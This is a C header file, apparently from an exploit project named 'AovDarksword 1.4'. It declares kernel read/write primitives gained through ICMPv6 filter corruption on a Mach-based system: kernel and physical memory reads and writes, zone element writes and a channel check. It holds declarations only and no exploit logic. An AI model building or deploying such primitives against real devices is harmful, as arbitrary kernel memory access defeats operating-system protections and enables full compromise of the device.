/*
 * krw.h — Kernel Read/Write primitives
 * AovDarksword 1.4
 * Socket-based kR/W via ICMPv6 filter corruption
 */

#ifndef KRW_H
#define KRW_H

#include <stdint.h>
#include <stddef.h>
#include <stdbool.h>
#include <mach/mach.h>

#define EARLY_KRW_LENGTH 0x4000

/* Global error tracking */
extern int g_krw_error;

/* Initialize the socket-based kernel R/W channel */
int  krw_init(uint64_t controlSocketAddr, uint64_t rwSocketAddr);
void krw_cleanup(void);

/* Basic kernel read/write */
uint32_t kread32(uint64_t kaddr);
uint64_t kread64(uint64_t kaddr);
int      kread_buf(uint64_t kaddr, void *buf, size_t len);

int      kwrite32(uint64_t kaddr, uint32_t val);
int      kwrite64(uint64_t kaddr, uint64_t val);
int      kwrite_buf(uint64_t kaddr, const void *buf, size_t len);

/* Early read (before full kR/W channel, via getsockopt) */
uint64_t early_kread64(uint64_t kaddr);

/* Physical memory R/W (requires gVirtBase/gPhysBase) */
uint64_t physread64_user(uint64_t pa);
int      physwrite64_user(uint64_t pa, uint64_t val);

/* Zone element write */
int kwrite_zone_element(uint64_t kaddr, const void *buf, size_t len);

/* Verify R/W channel is working */
bool krw_verify(uint64_t kernel_base);

#endif /* KRW_H */
